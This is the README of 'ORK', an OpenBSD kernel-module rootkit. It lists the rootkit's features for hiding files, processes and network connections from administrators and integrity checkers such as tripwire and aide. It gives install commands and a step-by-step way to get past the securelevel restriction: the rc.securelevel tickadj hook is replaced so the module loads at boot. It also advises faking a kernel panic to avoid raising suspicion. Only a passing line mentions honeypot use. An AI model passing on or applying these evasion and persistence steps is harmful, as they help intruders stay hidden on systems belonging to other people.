ORK (Openbsd RootKit) v.0.1
Meder Kydyraliev <meder@areopag.net>

FEATURES
~~~~~~~~
	- hides files from admins and intergrity checkers
	  such as tripwire, aide, etc;
	- hides procs and blocks signals to those procs;
	- hides TCP network connection to/from specified port;
	- LKM itself is completely invisible;

OpenBSD VERSIONS
~~~~~~~~~~~~~~~~
	Written and tested on OpenBSD 3.4

INSTALLATION
~~~~~~~~~~~~
	#tar zxvf ork-0.1.tar.gz
	#cd ork-0.1
	<edit 'tickadj' shell script and define ORKHOME>

Kernel sources are needed to compile ORK, however object file is 
provided also (for OpenBSD 3.4 - ELF), if kernel sourceS aren't
available skip the 'make' command below and type only:

	#make install && make load

If kernel sources are available and you want to recompile ORK type:

	#make && make install && make load

	NOTE: by default in OpenBSD LKMs cannon be loaded because
	securitylevel is set to '1'. It cannot be set to lower value
	and can only be raised. Unless admin was stupid enough to set
	securitylevel to '-1' we need to find a way to load the LKM.
	Luckily enough there is a way (there are probably a lot more
	other ways):
	If you look in /etc/rc.securelevel, you'll see:

	if [ X"${ntpd}" == X"YES" -a -x /usr/local/sbin/tickadj \
    	-a -e /etc/ntp.conf ]; then
       		echo -n ' tickadj';	/usr/local/sbin/tickadj -Aq
	fi

	Which means that if ntpd value is set to 'YES' in /etc/rc.conf
	and /usr/local/sbin/tickadj file is executable and /etc/ntp.conf
	file exists, /usr/local/sbin/tickadj is _EXECUTED_ before security
	level is raised. By default ntpd is set to 'YES' in /etc/rc.conf
	So when you type 'make install' it'll create /etc/ntp.conf and copy
	our tickadj to /usr/local/sbin with original tickadj being copied to
	/usr/local/bin/ork_tickadj.

So after you have done steps above, ORK will either be loaded (if 
securelevel was low enough) or it will be loaded on next boot. If
you think that simple reboot will be too suspicious you can emulate
kernel panic with message in /var/log/messages, of course if machine
rebooted because of kernel panic and ddb.panic was set to '1' smart
admin could become suspicious.

ORK can also be used on honeypots to hide procs, connection and files
from kiddies.

And last thing, you need to start all the processes that you want to be
hidden _BEFORE_ you load the ORK as those files will be hidden once ORK
is loaded. You can add your commands to 'tickadj' before the make commands.

Comments, suggestions and bugreports are always welcome!!!
